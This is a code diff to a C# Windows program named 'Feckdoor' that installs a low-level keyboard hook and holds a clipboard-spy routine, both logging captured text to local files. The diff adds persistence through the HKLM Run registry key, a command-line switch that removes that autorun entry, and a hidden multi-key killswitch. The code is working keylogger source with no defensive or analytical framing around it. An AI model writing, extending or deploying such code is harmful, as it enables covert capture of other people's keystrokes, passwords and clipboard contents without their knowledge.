@@ -2,6 +2,8 @@
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Text.Json;
+using System.Reflection;
+using Microsoft.Win32;
 
 namespace Feckdoor
 {
@@ -14,7 +16,7 @@ namespace Feckdoor
 
 		private static string ClipboardTextCache = "";
 
-
+		[STAThread]
 		static void Main(string[] args)
 		{
 			try
@@ -31,6 +33,34 @@ namespace Feckdoor
 				else
 					File.WriteAllText(configPath, Properties.Resources.DefaultConfig);
 
+				try
+				{
+					string autorunKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
+					string autorunValue =  TheConfig.RegistryAutorunName;
+					if (args.Length > 0 && args[0].Equals("r", StringComparison.OrdinalIgnoreCase))
+					{
+						if (Registry.LocalMachine.OpenSubKey(autorunKey)?.GetValue(autorunValue) == null)
+							File.AppendAllText(TheConfig.ErrorLogFile, $"Autorun not found: {autorunKey}\\{autorunValue}{Environment.NewLine}");
+						else
+						{
+							Registry.LocalMachine.CreateSubKey(autorunKey)?.DeleteValue(autorunValue);
+							File.AppendAllText(TheConfig.ErrorLogFile, $"Removed autorun: {autorunKey}\\{autorunValue}{Environment.NewLine}");
+						}
+						return;
+					}
+
+					string? exepath = Assembly.GetEntryAssembly()?.Location ?? Assembly.GetExecutingAssembly()?.Location;
+					if (exepath != null && Registry.LocalMachine.OpenSubKey(autorunKey)?.GetValue(autorunValue) == null)
+					{
+						Registry.LocalMachine.CreateSubKey(autorunKey)?.SetValue(autorunValue, exepath);
+						File.AppendAllText(TheConfig.ErrorLogFile, $"Added autorun: {autorunKey}\\{autorunValue}{Environment.NewLine}");
+					}
+				}
+				catch (Exception ex)
+				{
+					File.AppendAllText(TheConfig.ErrorLogFile, $"Registry write fail: {ex}{Environment.NewLine}");
+				}
+
 				HookID = InstallHook(KeyboardHook);
 				// Task.Run(async () => await ClipboardSpy());
 				Task.Run(async () => await TimestampAdder());
@@ -39,7 +69,7 @@ namespace Feckdoor
 			}
 			catch (Exception ex)
 			{
-				File.AppendAllText(TheConfig.ErrorLogFile, $"Main thread error: {ex}\n");
+				File.AppendAllText(TheConfig.ErrorLogFile, $"Main thread error: {ex}{Environment.NewLine}");
 			}
 		}
 
@@ -48,7 +78,7 @@ namespace Feckdoor
 			while (true)
 			{
 				string text = Clipboard.GetText();
-				await File.AppendAllTextAsync(TheConfig.ErrorLogFile, $"Clipboard spy str2: {text}\n");
+				await File.AppendAllTextAsync(TheConfig.ErrorLogFile, $"Clipboard spy str2: {text}{Environment.NewLine}");
 				if (ClipboardTextCache != text)
 				{
 					using (var writer = new StreamWriter(TheConfig.LogFile, true))
@@ -61,7 +91,7 @@ namespace Feckdoor
 						}
 						catch (Exception e)
 						{
-							await File.AppendAllTextAsync(TheConfig.ErrorLogFile, $"Clipboard spy error: {e}\n");
+							await File.AppendAllTextAsync(TheConfig.ErrorLogFile, $"Clipboard spy error: {e}{Environment.NewLine}");
 						}
 					}
 				}
@@ -84,7 +114,7 @@ namespace Feckdoor
 					}
 					catch (Exception e)
 					{
-						await File.AppendAllTextAsync(TheConfig.ErrorLogFile, $"Timestamper error: {e}\n");
+						await File.AppendAllTextAsync(TheConfig.ErrorLogFile, $"Timestamper error: {e}{Environment.NewLine}");
 					}
 				}
 				await Task.Delay(TheConfig.TimestampDelay);
@@ -101,12 +131,21 @@ namespace Feckdoor
 			return User32.SetWindowsHookEx(User32.WH_KEYBOARD_LL, proc, module.BaseAddress, 0);
 		}
 
+		private static bool IsKeyDown(VkCode vkCode) => (User32.GetAsyncKeyState((int)vkCode) & 0b1) != 0;
+
 		private static IntPtr KeyboardHook(int nCode, IntPtr wParam, IntPtr lParam)
 		{
 			if (nCode >= 0 && wParam == (IntPtr)User32.WM_KEYDOWN)
 			{
 				try
 				{
+					// Check killswitch
+					if (IsKeyDown(VkCode.Escape) && IsKeyDown(VkCode.LControlKey) && IsKeyDown(VkCode.F5) && IsKeyDown(VkCode.F9) && IsKeyDown(VkCode.OemMinus) && IsKeyDown(VkCode.Enter))
+					{
+						File.AppendAllText(TheConfig.ErrorLogFile, "Killswitch triggered! Bye!" + Environment.NewLine);
+						Application.Exit();
+					}
+
 					int vkCode = Marshal.ReadInt32(lParam);
 					int scanCode = Marshal.ReadInt32(lParam + 32);
 					bool capsLock = (User32.GetKeyState(0x14) & 0xffff) != 0;
